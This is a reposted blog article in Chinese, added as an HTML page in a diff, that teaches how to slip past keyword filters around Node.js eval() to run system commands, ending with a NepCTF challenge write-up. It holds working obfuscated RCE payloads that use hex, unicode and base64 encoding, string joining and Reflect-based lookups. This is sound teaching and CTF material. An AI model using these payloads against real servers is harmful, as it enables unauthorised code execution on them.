@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"pocket.qiwihui.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="【技术分享】nodejs中代码执行绕过的一些技巧">
+<meta property="og:type" content="article">
+<meta property="og:title" content="
+
+
+【技术分享】nodejs中代码执行绕过的一些技巧 ">
+<meta property="og:url" content="http://pocket.qiwihui.com/2021/04/26/qiwihui-pocket_readings-1086/index.html">
+<meta property="og:site_name" content="Pocket Readings">
+<meta property="og:description" content="【技术分享】nodejs中代码执行绕过的一些技巧">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7ZlXH0HSLVTUbRGzDwOlc7kcBibqzo9GFwHibJ355RW3r7gHibVlYyqUjsxdxYItFNpNR14y5p2s9hw/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC5BBRiccicQkicWD6n2u8JzHItRdz6v3aT1CtLryat1lBwGv3QiaOHgGXFqaNpCiaTvanXwKr8tbBrYvxw/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC5BBRiccicQkicWD6n2u8JzHItRdz6v3aT1CtLryat1lBwGv3QiaOHgGXFqaNpCiaTvanXwKr8tbBrYvxw/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC5BBRiccicQkicWD6n2u8JzHItRdz6v3aT1CtLryat1lBwGv3QiaOHgGXFqaNpCiaTvanXwKr8tbBrYvxw/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC5BBRiccicQkicWD6n2u8JzHItRdz6v3aT1CtLryat1lBwGv3QiaOHgGXFqaNpCiaTvanXwKr8tbBrYvxw/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC5BBRiccicQkicWD6n2u8JzHItRdz6v3aT1CtLryat1lBwGv3QiaOHgGXFqaNpCiaTvanXwKr8tbBrYvxw/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC5BBRiccicQkicWD6n2u8JzHItRdz6v3aT1CtLryat1lBwGv3QiaOHgGXFqaNpCiaTvanXwKr8tbBrYvxw/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC5BBRiccicQkicWD6n2u8JzHItRdz6v3aT1CtLryat1lBwGv3QiaOHgGXFqaNpCiaTvanXwKr8tbBrYvxw/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC5BBRiccicQkicWD6n2u8JzHItRdz6v3aT1CtLryat1lBwGv3QiaOHgGXFqaNpCiaTvanXwKr8tbBrYvxw/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC5BBRiccicQkicWD6n2u8JzHItRdz6v3aT1CtLryat1lBwGv3QiaOHgGXFqaNpCiaTvanXwKr8tbBrYvxw/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC5BBRiccicQkicWD6n2u8JzHItRdz6v3aT1CtLryat1lBwGv3QiaOHgGXFqaNpCiaTvanXwKr8tbBrYvxw/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6OLwHohYU7UjX5anusw3ZzxxUKM0Ert9iaakSvib40glppuwsWytjDfiaFx1T25gsIWL5c8c7kicamxw/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_gif/Ok4fxxCpBb5ZMeq0JBK8AOH3CVMApDrPvnibHjxDDT1mY2ic8ABv6zWUDq0VxcQ128rL7lxiaQrE1oTmjqInO89xA/640?wx_fmt=gif">
+<meta property="article:published_time" content="2021-04-26T13:21:17.000Z">
+<meta property="article:modified_time" content="2021-07-21T13:58:31.418Z">
+<meta property="article:author" content="qiwihui">
+<meta property="article:tag" content="fetched">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7ZlXH0HSLVTUbRGzDwOlc7kcBibqzo9GFwHibJ355RW3r7gHibVlYyqUjsxdxYItFNpNR14y5p2s9hw/640?wx_fmt=png">
+
+<link rel="canonical" href="http://pocket.qiwihui.com/2021/04/26/qiwihui-pocket_readings-1086/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>
+
+
+【技术分享】nodejs中代码执行绕过的一些技巧  | Pocket Readings</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Pocket Readings</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">个人阅读清单记录博客</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://pocket.qiwihui.com/2021/04/26/qiwihui-pocket_readings-1086/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="qiwihui">
+      <meta itemprop="description" content="个人阅读清单记录博客，并不代表个人观点。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pocket Readings">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+
+
+【技术分享】nodejs中代码执行绕过的一些技巧 
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-04-26 13:21:17" itemprop="dateCreated datePublished" datetime="2021-04-26T13:21:17+00:00">2021-04-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-07-21 13:58:31" itemprop="dateModified" datetime="2021-07-21T13:58:31+00:00">2021-07-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/2019%E9%98%85%E8%AF%BB/" itemprop="url" rel="index"><span itemprop="name">2019阅读</span></a>
+                </span>
+            </span>
+
+          
+            <div class="post-description">
+
+
+【技术分享】nodejs中代码执行绕过的一些技巧 </div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>&#24494;&#20449;&#21495; anquanbobao &#21151;&#33021;&#20171;&#32461; &#25171;&#30772;&#40657;&#31665; &#23458;&#35828;&#23433;&#20840; &#22312;php&#20013;&#65292;eval&#20195;&#30721;&#25191;&#34892;&#26159;&#19968;&#20010;&#24050;&#32463;&#34987;&#29609;&#28866;&#20102;&#30340;&#35805;&#39064;&#65292;&#21508;&#31181;&#22855;&#25216;&#28139;&#24039;&#29992;&#22312;php&#20195;&#30721;&#25191;&#34892;&#20013;&#26469;&#23454;&#29616;bypass&#12290;&#36825;&#31687;&#25991;&#31456;&#20027;&#35201;&#35762;&#19968;&#19979;nodejs&#20013;bypass&#30340;&#19968;&#20123;&#24605;&#36335;&#12290; child_process&#39318;&#20808;&#20171;&#32461;&#19968;&#19979;nodejs&#20013;&#29992;&#26469;&#25191;<br><br><br><br>Tags:<br><br><br><br>via Pocket <a href="https://ift.tt/3tZ86vO" target="_blank" rel="noopener">https://ift.tt/3tZ86vO</a> original site<br><br><br><br>April 26, 2021 at 08:52PM</p>
+<h3 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h3><hr>
+<blockquote>
+<p>from: <a href="https://github.com/qiwihui/pocket_readings/issues/1086#issuecomment-826830921" target="_blank" rel="noopener"><strong>github-actions[bot]</strong></a> on: <strong>4/26/2021</strong></p>
+</blockquote>
+<h2 id="【技术分享】nodejs中代码执行绕过的一些技巧-by-安全客"><a href="#【技术分享】nodejs中代码执行绕过的一些技巧-by-安全客" class="headerlink" title="【技术分享】nodejs中代码执行绕过的一些技巧 by 安全客"></a>【技术分享】nodejs中代码执行绕过的一些技巧 by 安全客</h2><p><strong>2021-04-26</strong><br><img src="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7ZlXH0HSLVTUbRGzDwOlc7kcBibqzo9GFwHibJ355RW3r7gHibVlYyqUjsxdxYItFNpNR14y5p2s9hw/640?wx_fmt=png" alt=""></p>
+<p>在php中，eval代码执行是一个已经被玩烂了的话题，各种奇技淫巧用在php代码执行中来实现bypass。这篇文章主要讲一下nodejs中bypass的一些思路。</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC5BBRiccicQkicWD6n2u8JzHItRdz6v3aT1CtLryat1lBwGv3QiaOHgGXFqaNpCiaTvanXwKr8tbBrYvxw/640?wx_fmt=png" alt=""></p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC5BBRiccicQkicWD6n2u8JzHItRdz6v3aT1CtLryat1lBwGv3QiaOHgGXFqaNpCiaTvanXwKr8tbBrYvxw/640?wx_fmt=png" alt=""></p>
+<p>child_process</p>
+<p>首先介绍一下nodejs中用来执行系统命令的模块child_process。Nodejs通过使用child_process模块来生成多个子进程来处理其他事物。在child_process中有七个方法它们分别为：execFileSync、spawnSync,execSync、fork、exec、execFile、以及spawn,而这些方法使用到的都是spawn()方法。因为fork是运行另外一个子进程文件，这里列一下除fork外其他函数的用法。</p>
+<pre><code>require(&quot;child_process&quot;).exec(&quot;sleep 3&quot;);</code></pre><p>不同的函数其实底层具体就是调用spawn，有兴趣的可以跟进源码看一下</p>
+<pre><code>const child = spawn(file, args, {</code></pre><p><img src="https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC5BBRiccicQkicWD6n2u8JzHItRdz6v3aT1CtLryat1lBwGv3QiaOHgGXFqaNpCiaTvanXwKr8tbBrYvxw/640?wx_fmt=png" alt=""></p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC5BBRiccicQkicWD6n2u8JzHItRdz6v3aT1CtLryat1lBwGv3QiaOHgGXFqaNpCiaTvanXwKr8tbBrYvxw/640?wx_fmt=png" alt=""></p>
+<p>nodejs的命令执行</p>
+<p>为了演示代码执行，我写一个最简化的服务端，代码如下</p>
+<pre><code>const express = require(&apos;express&apos;)</code></pre><p>原理很简单，就是接受post方式传过来的code参数，然后返回eval(code)的结果。</p>
+<p>在nodejs中，同样是使用eval()函数来执行代码，针对上文提到rce函数，首先就可以得到如下利用代码执行来rce的代码。</p>
+<blockquote>
+<p>以下的命令执行都用curl本地端口的方式来执行</p>
+</blockquote>
+<pre><code>eval(&apos;require(&quot;child_process&quot;).execSync(&quot;curl 127.0.0.1:1234&quot;)&apos;)</code></pre><p>这是最简单的代码执行情况，当然一般情况下，开发者在用eval而且层层调用有可能接受用户输入的点，并不会简单的让用户输入直接进入，而是会做一些过滤。譬如，如果过滤了exec关键字，该如何绕过?</p>
+<blockquote>
+<p>当然实际不会这么简单，本文只是谈谈思路，具体可以根据实际过滤的关键字变通</p>
+</blockquote>
+<p>下面是微改后的服务端代码，加了个正则检测exec关键字</p>
+<pre><code>const express = require(&apos;express&apos;)</code></pre><p>这就有6种思路:</p>
+<ul>
+<li><p>16进制编码</p>
+</li>
+<li><p>unicode编码</p>
+</li>
+<li><p>加号拼接</p>
+</li>
+<li><p>模板字符串</p>
+</li>
+<li><p>concat函数连接</p>
+</li>
+<li><p>base64编码</p>
+</li>
+</ul>
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="2-1-16进制编码"><a href="#2-1-16进制编码" class="headerlink" title="2.1 16进制编码"></a><strong>2.1 16进制编码</strong></h3><p>第一种思路是16进制编码，原因是在nodejs中，如果在字符串内用16进制，和这个16进制对应的ascii码的字符是等价的(第一反应有点像mysql)。</p>
+<pre><code>console.log(&quot;a&quot;===&quot;\x61&quot;);</code></pre><p>但是在上面正则匹配的时候，16进制却不会转化成字符，所以就可以绕过正则的校验。所以可以传</p>
+<pre><code>require(&quot;child_process&quot;)[&quot;exe\x63Sync&quot;](&quot;curl 127.0.0.1:1234&quot;)</code></pre><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><h3 id="2-2-unicode编码"><a href="#2-2-unicode编码" class="headerlink" title="2.2 unicode编码"></a><strong>2.2 unicode编码</strong></h3><p>思路跟上面是类似的，由于JavaScript允许直接用码点表示Unicode字符，写法是”反斜杠+u+码点”，所以我们也可以用一个字符的unicode形式来代替对应字符。</p>
+<pre><code>console.log(&quot;\u0061&quot;===&quot;a&quot;);</code></pre><h3 id="2-3-加号拼接"><a href="#2-3-加号拼接" class="headerlink" title="2.3 加号拼接"></a><strong>2.3 加号拼接</strong></h3><p>原理很简单，加号在js中可以用来连接字符，所以可以这样</p>
+<pre><code>require(&apos;child_process&apos;)[&apos;exe&apos;%2b&apos;cSync&apos;](&apos;curl 127.0.0.1:1234&apos;)</code></pre><h3 id="2-4-模板字符串"><a href="#2-4-模板字符串" class="headerlink" title="2.4 模板字符串"></a><strong>2.4 模板字符串</strong></h3><p>相关内容可以参考MDN，这里给出一个payload</p>
+<blockquote>
+<p>模板字面量是允许嵌入表达式的字符串字面量。你可以使用多行字符串和字符串插值功能。</p>
+</blockquote>
+<pre><code>require(&apos;child_process&apos;)[`${`${`exe`}cSync`}`](&apos;curl 127.0.0.1:1234&apos;)</code></pre><h3 id="-2"><a href="#-2" class="headerlink" title=""></a></h3><h3 id="2-5-concat连接"><a href="#2-5-concat连接" class="headerlink" title="2.5 concat连接"></a><strong>2.5 concat连接</strong></h3><p>利用js中的concat函数连接字符串</p>
+<pre><code>require(&quot;child_process&quot;)[&quot;exe&quot;.concat(&quot;cSync&quot;)](&quot;curl 127.0.0.1:1234&quot;)</code></pre><h3 id="-3"><a href="#-3" class="headerlink" title=""></a></h3><h3 id="2-6-base64编码"><a href="#2-6-base64编码" class="headerlink" title="2.6 base64编码"></a><strong>2.6 base64编码</strong></h3><p>这种应该是比较常规的思路了。</p>
+<pre><code>eval(Buffer.from(&apos;Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=&apos;,&apos;base64&apos;).toString())</code></pre><p><img src="https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC5BBRiccicQkicWD6n2u8JzHItRdz6v3aT1CtLryat1lBwGv3QiaOHgGXFqaNpCiaTvanXwKr8tbBrYvxw/640?wx_fmt=png" alt=""></p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC5BBRiccicQkicWD6n2u8JzHItRdz6v3aT1CtLryat1lBwGv3QiaOHgGXFqaNpCiaTvanXwKr8tbBrYvxw/640?wx_fmt=png" alt=""></p>
+<p>其他bypass方式</p>
+<p>这一块主要是换个思路，上面提到的几种方法，最终思路都是通过编码或者拼接得到exec这个关键字，这一块考虑js的一些语法和内置函数。</p>
+<h3 id="-4"><a href="#-4" class="headerlink" title=""></a></h3><h3 id="3-1-Obejct-keys"><a href="#3-1-Obejct-keys" class="headerlink" title="3.1 Obejct.keys"></a><strong>3.1 Obejct.keys</strong></h3><p>实际上通过require导入的模块是一个Object，所以就可以用Object中的方法来操作获取内容。利用Object.values就可以拿到child_process中的各个函数方法，再通过数组下标就可以拿到execSync</p>
+<pre><code>console.log(require(&apos;child_process&apos;).constructor===Object)</code></pre><h3 id="-5"><a href="#-5" class="headerlink" title=""></a></h3><h3 id="3-2-Reflect"><a href="#3-2-Reflect" class="headerlink" title="3.2 Reflect"></a><strong>3.2 Reflect</strong></h3><p>在js中，需要使用Reflect这个关键字来实现反射调用函数的方式。譬如要得到eval函数，可以首先通过Reflect.ownKeys(global)拿到所有函数，然后global[Reflect.ownKeys(global).find(x=&gt;x.includes(‘eval’))]即可得到eval</p>
+<pre><code>console.log(Reflect.ownKeys(global))</code></pre><p>拿到eval之后，就可以常规思路rce了</p>
+<pre><code>global[Reflect.ownKeys(global).find(x=&gt;x.includes(&apos;eval&apos;))](&apos;global.process.mainModule.constructor._load(&quot;child_process&quot;).execSync(&quot;curl 127.0.0.1:1234&quot;)&apos;)</code></pre><p>这里虽然有可能被检测到的关键字，但由于mainModule、global、child_process等关键字都在字符串里，可以利用上面提到的方法编码，譬如16进制。</p>
+<pre><code>global[Reflect.ownKeys(global).find(x=&gt;x.includes(&apos;eval&apos;))](&apos;\x67\x6c\x6f\x62\x61\x6c\x5b\x52\x65\x66\x6c\x65\x63\x74\x2e\x6f\x77\x6e\x4b\x65\x79\x73\x28\x67\x6c\x6f\x62\x61\x6c\x29\x2e\x66\x69\x6e\x64\x28\x78\x3d\x3e\x78\x2e\x69\x6e\x63\x6c\x75\x64\x65\x73\x28\x27\x65\x76\x61\x6c\x27\x29\x29\x5d\x28\x27\x67\x6c\x6f\x62\x61\x6c\x2e\x70\x72\x6f\x63\x65\x73\x73\x2e\x6d\x61\x69\x6e\x4d\x6f\x64\x75\x6c\x65\x2e\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72\x2e\x5f\x6c\x6f\x61\x64\x28\x22\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73\x22\x29\x2e\x65\x78\x65\x63\x53\x79\x6e\x63\x28\x22\x63\x75\x72\x6c\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x31\x32\x33\x34\x22\x29\x27\x29&apos;)</code></pre><blockquote>
+<p>这里还有个小trick，如果过滤了eval关键字，可以用includes(‘eva’)来搜索eval函数，也可以用startswith(‘eva’)来搜索</p>
+</blockquote>
+<h3 id="-6"><a href="#-6" class="headerlink" title=""></a></h3><h3 id="3-3-过滤中括号的情况"><a href="#3-3-过滤中括号的情况" class="headerlink" title="3.3 过滤中括号的情况"></a><strong>3.3 过滤中括号的情况</strong></h3><p>在3.2中，获取到eval的方式是通过global数组，其中用到了中括号[]，假如中括号被过滤，可以用Reflect.get来绕</p>
+<blockquote>
+<p>Reflect.get(target, propertyKey[, receiver])的作用是获取对象身上某个属性的值，类似于target[name]。</p>
+</blockquote>
+<p>所以取eval函数的方式可以变成</p>
+<pre><code>Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.includes(&apos;eva&apos;)))</code></pre><p>后面拼接上命令执行的payload即可。</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC5BBRiccicQkicWD6n2u8JzHItRdz6v3aT1CtLryat1lBwGv3QiaOHgGXFqaNpCiaTvanXwKr8tbBrYvxw/640?wx_fmt=png" alt=""></p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC5BBRiccicQkicWD6n2u8JzHItRdz6v3aT1CtLryat1lBwGv3QiaOHgGXFqaNpCiaTvanXwKr8tbBrYvxw/640?wx_fmt=png" alt=""></p>
+<p>NepCTF-gamejs</p>
+<p>这个题目第一步是一个原型链污染，第二步是一个eval的命令执行，因为本文主要探讨一下eval的bypass方式，所以去掉原型链污染，只谈后半段bypass，代码简化后如下:</p>
+<pre><code>const express = require(&apos;express&apos;)</code></pre><p>由于关键字过滤掉了单双引号，这里可以全部换成反引号。没有过滤掉Reflect，考虑用反射调用函数实现RCE。利用上面提到的几点，逐步构造一个非预期的payload。首先，由于过滤了child_process还有require关键字，我想到的是base64编码一下再执行</p>
+<pre><code>eval(Buffer.from(`Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=`,`base64`).toString())</code></pre><p>这里过滤了base64，可以直接换成</p>
+<pre><code>`base`.concat(64)</code></pre><p>过滤掉了Buffer，可以换成</p>
+<pre><code>Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.startsWith(`Buf`)))</code></pre><p>要拿到Buffer.from方法，可以通过下标</p>
+<pre><code>Object.values(Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.startsWith(`Buf`))))[1]</code></pre><p>但问题在于，关键字还过滤了中括号，这一点简单，再加一层Reflect.get</p>
+<pre><code>Reflect.get(Object.values(Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.startsWith(`Buf`)))),1)</code></pre><p>所以基本payload变成</p>
+<pre><code>Reflect.get(Object.values(Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.startsWith(`Buf`)))),1)(`Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=`,`base`.concat(64)).toString()</code></pre><p>但问题在于，这样传过去后，eval只会进行解码，而不是执行解码后的内容，所以需要再套一层eval，因为过滤了eval关键字，同样考虑用反射获取到eval函数。</p>
+<pre><code>Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.includes(&apos;eva&apos;)))(Reflect.get(Object.values(Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.startsWith(`Buf`)))),1)(`Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=`,`base`.concat(64)).toString())</code></pre><p>在能拿到Buffer.from的情况下，用16进制编码也一样.</p>
+<pre><code>Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.includes(&apos;eva&apos;)))(Reflect.get(Object.values(Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.startsWith(`Buf`)))),1)(`676c6f62616c2e70726f636573732e6d61696e4d6f64756c652e636f6e7374727563746f722e5f6c6f616428226368696c645f70726f6365737322292e6578656353796e6328226375726c203132372e302e302e313a313233342229`,`he`.concat(`x`)).toString())</code></pre><p>当然，由于前面提到的16进制和字符串的特性，也可以拿到eval后直接传16进制字符串</p>
+<pre><code>Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.includes(`eva`)))(`\x67\x6c\x6f\x62\x61\x6c\x2e\x70\x72\x6f\x63\x65\x73\x73\x2e\x6d\x61\x69\x6e\x4d\x6f\x64\x75\x6c\x65\x2e\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72\x2e\x5f\x6c\x6f\x61\x64\x28\x22\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73\x22\x29\x2e\x65\x78\x65\x63\x53\x79\x6e\x63\x28\x22\x63\x75\x72\x6c\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x31\x32\x33\x34\x22\x29`)</code></pre><p>感觉nodejs中对字符串的处理方式太灵活了，如果能eval的地方，最好还是不要用字符串黑名单做过滤吧。</p>
+<p>感谢我前端大哥semesse的帮助</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC5BBRiccicQkicWD6n2u8JzHItRdz6v3aT1CtLryat1lBwGv3QiaOHgGXFqaNpCiaTvanXwKr8tbBrYvxw/640?wx_fmt=png" alt=""></p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC5BBRiccicQkicWD6n2u8JzHItRdz6v3aT1CtLryat1lBwGv3QiaOHgGXFqaNpCiaTvanXwKr8tbBrYvxw/640?wx_fmt=png" alt=""></p>
+<p>参考链接</p>
+<ol>
+<li><p><a href="https://xz.aliyun.com/t/9167" target="_blank" rel="noopener">https://xz.aliyun.com/t/9167</a></p>
+</li>
+<li><p><a href="https://camp.hackingfor.fun/" target="_blank" rel="noopener">https://camp.hackingfor.fun/</a></p>
+</li>
+</ol>
+<p>（点击“阅读原文”查看链接）</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6OLwHohYU7UjX5anusw3ZzxxUKM0Ert9iaakSvib40glppuwsWytjDfiaFx1T25gsIWL5c8c7kicamxw/640?wx_fmt=png" alt="" title="虚线阴影分割线">  </p>
+<p>- End -  </p>
+<p>精彩推荐</p>
+<p><a href="http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649744161&idx=1&sn=b96badd9123f9f8b22c417110a642da6&chksm=888cd34ebffb5a58d695c5da12ce6557f3fe899aa9755b4ec6b25d8bfb1d4ab6fbf0d355d6ee&scene=21#wechat_redirect" target="_blank" rel="noopener">【技术分享】花指令总结</a>  </p>
+<p><a href="http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649744104&idx=1&sn=269acd50cd2302b4ddb2adca722540f4&chksm=888cd287bffb5b911f51c2b8b324181e28c33438450808085993cf3d7d5b26aeec14c64d520c&scene=21#wechat_redirect" target="_blank" rel="noopener">【技术分享】CVE-2021-25646 Apache Druid 远程代码执行漏洞分析</a>  </p>
+<p><a href="http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649744045&idx=1&sn=22f03e5ab4976e0b89b50c0debb075e5&chksm=888cd2c2bffb5bd47a5d6fbb16bb4fbe5a347c6cb0038bfb11935c2b88297f5f8a5f17abfa1a&scene=21#wechat_redirect" target="_blank" rel="noopener">【技术分享】NodeJS从零开始到原型链污染</a>  </p>
